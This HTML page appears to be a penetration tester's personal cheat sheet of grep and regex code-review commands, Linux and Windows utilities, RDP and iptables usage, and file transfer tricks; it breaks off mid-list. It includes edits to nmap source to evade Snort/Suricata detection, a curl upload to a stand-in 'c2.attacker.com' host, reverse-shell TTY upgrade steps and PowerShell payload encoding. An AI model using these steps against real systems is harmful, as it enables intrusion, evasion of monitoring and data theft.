<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="readloud">
    
    <link rel="shortcut icon" href="../../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Code review &amp; Regular Expression commands - readloud.org</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Code review \u0026amp; Regular Expression commands", url: "#_top", children: [
              {title: "Grep Fu section", url: "#grep-fu-section" },
              {title: "Regex Section", url: "#regex-section" },
              {title: "Modyfy the following file to remove SNORT/Suricata detections", url: "#modyfy-the-following-file-to-remove-snortsuricata-detections" },
              {title: "User-Agent", url: "#user-agent" },
              {title: "TCP Windows", url: "#tcp-windows" },
              {title: "ZMap", url: "#zmap" },
          ]},
          {title: "Useful commands in Linux", url: "#useful-commands-in-linux", children: [
              {title: "comm", url: "#comm" },
              {title: "read", url: "#read" },
              {title: "sed", url: "#sed" },
              {title: "shred", url: "#shred" },
              {title: "testdisk", url: "#testdisk" },
              {title: "ps (Wide output)", url: "#ps-wide-output" },
              {title: "grep", url: "#grep" },
              {title: "RDP", url: "#rdp" },
              {title: "iptables ^4", url: "#iptables-4" },
              {title: "Mirror a website", url: "#mirror-a-website" },
              {title: "Upload files via Curl", url: "#upload-files-via-curl" },
              {title: "Upgrade Reverse shell to fully interactive TTY[^6]", url: "#upgrade-reverse-shell-to-fully-interactive-tty6" },
              {title: "Create a user", url: "#create-a-user" },
              {title: "Transfer files using nc (netcat)[^7]", url: "#transfer-files-using-nc-netcat7" },
              {title: "Base64 encode", url: "#base64-encode" },
              {title: "Rsync", url: "#rsync" },
              {title: "Compressed RDP for low bandwidth", url: "#compressed-rdp-for-low-bandwidth" },
              {title: "Encrypting files", url: "#encrypting-files" },
              {title: "Generate random passwords", url: "#generate-random-passwords" },
              {title: "Go through filenames with spaces", url: "#go-through-filenames-with-spaces" },
              {title: "List files and sort via date time", url: "#list-files-and-sort-via-date-time" },
              {title: "Sort contents of a file in reverse", url: "#sort-contents-of-a-file-in-reverse" },
              {title: "Beep", url: "#beep" },
              {title: "grep for file extensions", url: "#grep-for-file-extensions" },
          ]},
          {title: "Mobile App Security Testing", url: "#mobile-app-security-testing", children: [
              {title: "Logcat", url: "#logcat" },
          ]},
          {title: "Useful tips and tricks in Python", url: "#useful-tips-and-tricks-in-python", children: [
              {title: "TEMPLATE or Skeleton script with tips and references", url: "#template-or-skeleton-script-with-tips-and-references" },
              {title: "Generate requirements.txt", url: "#generate-requirementstxt" },
              {title: "Update all pip packages", url: "#update-all-pip-packages" },
              {title: "Global Variables", url: "#global-variables" },
              {title: "URL Encode Python String", url: "#url-encode-python-string" },
              {title: "Accept custom certificate", url: "#accept-custom-certificate" },
          ]},
          {title: "WinDbg", url: "#windbg", children: [
              {title: "Shortcut Keys", url: "#shortcut-keys" },
              {title: "Basic commands/shortcuts", url: "#basic-commandsshortcuts" },
          ]},
          {title: "Useful commands in Windows", url: "#useful-commands-in-windows", children: [
              {title: "Windows - Command Prompt", url: "#windows-command-prompt" },
              {title: "Windows - Powershell", url: "#windows-powershell" },
              {title: "Print all HTTP Response Headers", url: "#print-all-http-response-headers" },
              {title: "Print Full HTTP Request and Response", url: "#print-full-http-request-and-response" },
          ]},
          {title: "JQ tips", url: "#jq-tips", children: [
              {title: "Disclaimer", url: "#disclaimer" },
              {title: "Installation", url: "#installation" },
              {title: "Filtering (Grepping) for specific key values, then selecting a specific key afterwards", url: "#filtering-grepping-for-specific-key-values-then-selecting-a-specific-key-afterwards" },
              {title: "Printing 2 or more values", url: "#printing-2-or-more-values" },
          ]},
          {title: "How to list USB devices on linux command line", url: "#how-to-list-usb-devices-on-linux-command-line", children: [
              {title: "Table of Contents", url: "#table-of-contents" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    

    <h1 id="code-review-regular-expression-commands">Code review &amp; Regular Expression commands</h1>
<ul>
<li>Used for manual code review</li>
<li>A good IDE could also help in tracing once specific lines are found</li>
<li>A simple example of editors that could do this is Sublime Text and Notepad++ which can search through folders and use regex</li>
<li>For more Regex references, see my <a href="https://github.com/trojand/Script_Yard/blob/main/TEMPLATE.py">TEMPLATE.py</a></li>
</ul>
<h2 id="grep-fu-section">Grep Fu section</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>for i in $(grep -R &lt;PATTERN_YOU_ARE_LOOKING_FOR&gt;|cut -d : -f 1|sort -u); do echo &quot;\n==========$i==========\n&quot; &amp;&amp; cat $i &amp;&amp; read -s -d &#39; &#39; &amp;&amp; clear;done
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>for i in $(grep -R &lt;$PATTERN1&gt;|cut -d : -f 1|sort -u); do echo &quot;\n==========$i==========\n&quot; &amp;&amp; cat $i|grep -i &lt;$PATTERN2&gt; &amp;&amp; read -s -d &#39; &#39; &amp;&amp; clear;done
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>for i in $(grep -R &lt;$PATTERN1&gt;|cut -d : -f 1|sort -u); do echo &quot;\n==========$i==========\n&quot; &amp;&amp; gedit $i;done
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>grep -rnw --color &quot;&lt;Pattern&gt;&quot;
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a># To show only-matching
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>grep -rnw -o --color &quot;&lt;Pattern&gt;&quot; 
</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a># To show only files containing tha pattern. Useful when there a lot of text in the grep
</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>grep -rnw -l --color &quot;&lt;Pattern&gt;&quot; 
</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a># To exclude certain file extensions.
</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>grep -rnw --color &quot;&lt;Pattern&gt;&quot; --exclude &quot;*.js&quot;
</span></code></pre></div>
<h2 id="regex-section">Regex Section</h2>
<h3 id="targetedgroup-matching">Targeted/Group Matching</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>perl -lne &#39;print $1 if /&lt;R(E)GEX&gt;/&#39; &lt; * 
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>perl -lne &#39;print &quot;$1/$2&quot; if /&lt;R(E)GE(X)&gt;/&#39; &lt; * 
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>perl -lne &#39;print &quot;$1/$2&quot; if /src=\&quot;(.*?)\/(.*?)\//&#39; blob.txt
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>for i in $(find .); do perl -lne &#39;print &quot;$1/$2&quot; if /src=\&quot;(.*?)\/(.*?)\//&#39; 2&gt;/dev/null &lt; $i;done|sort -u
</span></code></pre></div>
<h3 id="grouping1">Grouping<a href="[Siongui](https://siongui.github.io/2018/03/06/go-print-http-response-header/)">^1</a></h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>a(bc)           parentheses create a capturing group with value bc
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>a(?:bc)*        using ?: we disable the capturing group
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>a(?&lt;foo&gt;bc)     using ?&lt;foo&gt; we put a name to the group -&gt; Try it!
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>To Test: https://regex101.com
</span></code></pre></div>
<h3 id="email-regex">Email Regex</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+
</span></code></pre></div>
<h3 id="url-regex">URL Regex</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>https?://(www\.)?\w+\.\w+
</span></code></pre></div>
<h3 id="ip-address2">IP Address<a href="[StackOverflow](https://stackoverflow.com/questions/1583219/how-to-do-a-recursive-find-replace-of-a-string-with-awk-or-sed)">^2</a></h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>cat * | egrep -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;
</span></code></pre></div>
<h3 id="subdirectory-finder">Subdirectory finder</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>for i in $(find .); do perl -lne &#39;print &quot;$1&quot; if /https\:\/\/domain\.com\/(.*?)[\/\&quot;]/&#39;  2&gt;/dev/null &lt; $i;done|sort -u
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>for i in $(find .); do perl -lne &#39;print &quot;$1&quot; if /href\=\&quot;(.*?)[\/\&quot;]/&#39;  2&gt;/dev/null &lt; $i;done|grep -v &quot;http:&quot; |grep -v &quot;https:&quot; | sed &quot;s/\&amp;\#32\;/\ /g&quot; | grep -v &quot;\.html&quot; |sort -u
</span></code></pre></div>
<h2 id="modyfy-the-following-file-to-remove-snortsuricata-detections">Modyfy the following file to remove SNORT/Suricata detections</h2>
<p><br>
=&gt; <a href="https://raw.githubusercontent.com/nmap/nmap/master/osscan2.cc">osscan2.cc</a></p>
<h2 id="user-agent">User-Agent</h2>
<h3 id="et-scan-nmap-scripting-engine-user-agent-detected-nmap-scripting-engine">ET SCAN Nmap Scripting Engine User-Agent Detected (Nmap Scripting Engine</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>User-Agent will be seen in the packet so lets remove the default
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>
</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>SET =&gt; 
</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>USER_AGENT = stdnse.get_script_args(&#39;http.useragent&#39;) or &quot;Mozilla/3.0 (compatible; )&quot;
</span></code></pre></div>
<h2 id="tcp-windows">TCP Windows</h2>
<h3 id="et-scan-nmap-ss-window-1024">ET SCAN NMAP -sS window 1024</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>SET =&gt;
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>tcp-&gt;th_win = htons(9999); /* Who cares */
</span></code></pre></div>
<h2 id="zmap">ZMap</h2>
<h3 id="detect-zmap-scan">Detect ZMAP scan</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>SET=&gt;
</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>tcp_header-&gt;th_win = htons(65535);
</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>iph-&gt;ip_id = htons(54321);
</span></code></pre></div>
<h1 id="useful-commands-in-linux">Useful commands in Linux</h1>
<h2 id="comm">comm</h2>
<ul>
<li>Substitute if not satisfied with diff<a href="[Siongui](https://siongui.github.io/2018/03/06/go-print-http-response-header/)">^1</a>
<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>comm &lt;-123&gt; file1 file2 2&gt;/dev/null
</span></code></pre></div></li>
</ul>
<h2 id="read">read</h2>
<ul>
<li>Used for pausing mid loop and possibly asking for user input</li>
<li>Usually seen with <code>&lt;Press any key to continue&gt;</code>
<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a># Command below will pause the bash script till &lt;space&gt; is pressed
</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>read -s -d &#39; &#39;
</span></code></pre></div></li>
</ul>
<h2 id="sed">sed</h2>
<h3 id="basic-sed-commands">Basic Sed Commands</h3>
<ul>
<li>Replace 'newlines' or <code>\n</code> with sed
<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>cat targets.txt| sed -z &quot;s/\n/\/\nhttps:\/\//g&quot; &gt; targets_https.txt
</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>cat naabu_output.txt| sed -z &quot;s/\n/\/\nhttps:\/\//g&quot; &gt; naabu_all_ports_withoutIPs_https.txt
</span></code></pre></div></li>
<li>Remove 1st and last character
<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>cat lines.txt|sed &quot;s/^.//;s/.$//&quot;
</span></code></pre></div></li>
</ul>
<h3 id="recursive-sed">Recursive sed</h3>
<ul>
<li>In case you want to change values in a lot of text files</li>
<li>One of the many ways <a href="[StackOverflow](https://stackoverflow.com/questions/1583219/how-to-do-a-recursive-find-replace-of-a-string-with-awk-or-sed)">^2</a></li>
<li>Change the 4 values between <code>&lt; &gt;</code>
<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>find &lt;DIRECTORY_TO_FIND_FROM&gt; \( -type d -name &lt;DIRECTORY_YOU_WANT_TO_AVOID&gt; -prune \) -o -type f -print0 | xargs -0 sed -i &#39;s/&lt;ORIGINAL_TEXT&gt;/&lt;NEW_TEXT&gt;/g&#39;
</span></code></pre></div></li>
</ul>
<h2 id="shred">shred</h2>
<ul>
<li>Delete files</li>
<li>This cannot easily although still possible to be recovered
<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>shred -u &lt;file_to_delete&gt;
</span></code></pre></div></li>
</ul>
<h2 id="testdisk">testdisk</h2>
<ul>
<li>Recover accidentally deleted file (i.e. using <code class="language-bash highlight">rm</code>)[^3]
<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>sudo testdisk
</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a># View step 8 of the source. Select the option &quot;Undelete&quot; might not be there, choose &quot;List&quot;
</span></code></pre></div></li>
</ul>
<h2 id="ps-wide-output">ps (Wide output)</h2>
<ul>
<li>Everybody knows <code class="language-bash highlight">ps<span class="w"> </span>aux</code></li>
<li>this however generates a limited output</li>
<li>to show the whole command, do: (add or lessen 'w' if needed)
<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>ps auxwww
</span></code></pre></div></li>
</ul>
<h2 id="grep">grep</h2>
<ul>
<li>Asides from the common uses of grep</li>
<li>to filter out all lines ending in a specific character</li>
<li>Use case: filtering out exported URLs which has duplicates where one URL ends in '/' and one without
<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>echo &quot;aaaaaaa.rar\nbbbbbbbbrar&quot; &gt; /tmp/temp.txt
</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>
</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>$ cat /tmp/temp.txt | grep &#39;rar$&#39;
</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>aaaaaaa.rar
</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>bbbbbbbbrar
</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>
</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a>#Add &#39;\b&#39; for &quot;word-boundary&quot;
</span><span id="__span-18-8"><a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a>$ cat /tmp/temp.txt | grep &#39;\brar$&#39;
</span><span id="__span-18-9"><a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a>aaaaaaa.rar
</span><span id="__span-18-10"><a id="__codelineno-18-10" name="__codelineno-18-10" href="#__codelineno-18-10"></a>
</span><span id="__span-18-11"><a id="__codelineno-18-11" name="__codelineno-18-11" href="#__codelineno-18-11"></a>#Just add &#39;-v&#39; after &#39;grep&#39; to &quot;select non-matching lines&quot; / inverse
</span></code></pre></div></li>
</ul>
<h2 id="rdp">RDP</h2>
<ul>
<li>
<p>Connecting to a Windows host via RDP
<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a> xfreerdp +nego +sec-rdp +sec-tls +sec-nla /v:&lt;hostname/IP&gt;  /d: /u:&lt;username&gt; /p:&lt;password&gt; /size:90%
</span></code></pre></div></p>
</li>
<li>
<p>Compressed RDP for low bandwidth or slow RDP connections
<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a># MTU config first
</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>ifconfig mtu 1200 &lt;interface&gt;
</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>ifconfig mtu 1200 tun0
</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a>
</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a># rdesktop
</span><span id="__span-20-6"><a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a>rdesktop -a 16 -z -r sound:remote -x b -g 1900x1000 -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; 192.168.1.5
</span><span id="__span-20-7"><a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a>rdesktop -d &lt;domain&gt; -u &lt;username&gt; -p &lt;password or &#39;-&#39; for prompt&gt; -a 16 -P -z -E -T &lt;TAG-WindowName&gt; &lt;RDPHOST_IP&gt;
</span><span id="__span-20-8"><a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a>rdesktop -d company.local -u administrator -p P@ssw0rd -a 16 -P -z -E -T COMPANY-DC3 10.10.10.100
</span></code></pre></div></p>
</li>
</ul>
<h2 id="iptables-4">iptables <a href="[Phoenixnap](https://phoenixnap.com/kb/iptables-tutorial-linux-firewall)">^4</a></h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a># View rules
</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>sudo iptables -L --line-numbers
</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>
</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a># Add rule
</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a>sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a>sudo iptables -A INPUT -p tcp -s 192.168.1.0/24 --dport 22 -j ACCEPT
</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a>
</span><span id="__span-21-8"><a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a># Drop from everybody else
</span><span id="__span-21-9"><a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a>sudo iptables -A INPUT -p tcp --dport 22 -j DROP
</span><span id="__span-21-10"><a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a>
</span><span id="__span-21-11"><a id="__codelineno-21-11" name="__codelineno-21-11" href="#__codelineno-21-11"></a># Save rules
</span><span id="__span-21-12"><a id="__codelineno-21-12" name="__codelineno-21-12" href="#__codelineno-21-12"></a>sudo /sbin/iptables–save
</span><span id="__span-21-13"><a id="__codelineno-21-13" name="__codelineno-21-13" href="#__codelineno-21-13"></a>
</span><span id="__span-21-14"><a id="__codelineno-21-14" name="__codelineno-21-14" href="#__codelineno-21-14"></a># Delete Rule
</span><span id="__span-21-15"><a id="__codelineno-21-15" name="__codelineno-21-15" href="#__codelineno-21-15"></a>sudo iptables -D INPUT &lt;line_num&gt;
</span><span id="__span-21-16"><a id="__codelineno-21-16" name="__codelineno-21-16" href="#__codelineno-21-16"></a>
</span><span id="__span-21-17"><a id="__codelineno-21-17" name="__codelineno-21-17" href="#__codelineno-21-17"></a># Example:
</span><span id="__span-21-18"><a id="__codelineno-21-18" name="__codelineno-21-18" href="#__codelineno-21-18"></a># Only allow SSH connection from 192.168.1.0/24
</span><span id="__span-21-19"><a id="__codelineno-21-19" name="__codelineno-21-19" href="#__codelineno-21-19"></a>sudo iptables -A INPUT -p tcp -s 192.168.1.0/24 --dport 22 -j ACCEPT
</span><span id="__span-21-20"><a id="__codelineno-21-20" name="__codelineno-21-20" href="#__codelineno-21-20"></a>sudo iptables -A INPUT -p tcp --dport 22 -j DROP
</span></code></pre></div>
<h2 id="mirror-a-website">Mirror a website</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>wget --mirror --convert-links --adjust-extension --page-requisites --wait=1 -o wget-mirror.log --no-parent https://example.org
</span></code></pre></div>
<h2 id="upload-files-via-curl">Upload files via Curl</h2>
<ul>
<li>Combine with <a href="/cheatsheet/simple_python_go_packages#Projectdiscovery-SimpleHTTPserver">Simple HTTP(s) Servers</a>
<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>curl -k --user &#39;root:toor&#39; --upload-file file.zip https://127.0.0.1:8000/file.zip
</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>curl -k --user &#39;root:haxorz&#39; --upload-file file.zip https://c2.attacker.com:443/file.zip
</span></code></pre></div></li>
</ul>
<h2 id="upgrade-reverse-shell-to-fully-interactive-tty6">Upgrade Reverse shell to fully interactive TTY[^6]</h2>
<ul>
<li>In reverse shell 
<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>&lt;Ctrl-Z&gt;
</span></code></pre></div></li>
<li>In Attacker console
<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>stty raw -echo
</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>fg
</span></code></pre></div></li>
<li>In reverse shell
<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>reset
</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>export SHELL=bash
</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>export TERM=xterm-256color
</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>stty rows &lt;num&gt; columns &lt;cols&gt;
</span></code></pre></div></li>
</ul>
<h2 id="create-a-user">Create a user</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a># Create a user
</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>useradd user -U -s /bin/bash
</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a># Create a sudo user
</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a>useradd user -G sudo -U -s /bin/bash
</span></code></pre></div>
<h2 id="transfer-files-using-nc-netcat7">Transfer files using nc (netcat)[^7]</h2>
<ul>
<li>Basic
<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a># Receiving
</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>nc -l -p 9999 &gt; received_file.txt
</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a># Sending
</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a>nc 192.168.0.1 9999 &lt; received_file.txt
</span></code></pre></div></li>
<li>With compression
<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a># Receiving
</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>nc -l -p 9999 | xz -dc | tar xvf -
</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a># Sending
</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a>tar cvf - . | xz -c | nc 192.168.0.1 9999
</span></code></pre></div></li>
</ul>
<h2 id="base64-encode">Base64 encode</h2>
<ul>
<li>Some use cases:</li>
<li>Encoding <a href="/windows/shells#one-liners">Powershell one-liners</a>
<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>iconv -f ASCII -t UTF-16LE powershell_payload.txt | base64 | tr -d &quot;\n&quot;
</span></code></pre></div></li>
<li>Another way below but prioritize above
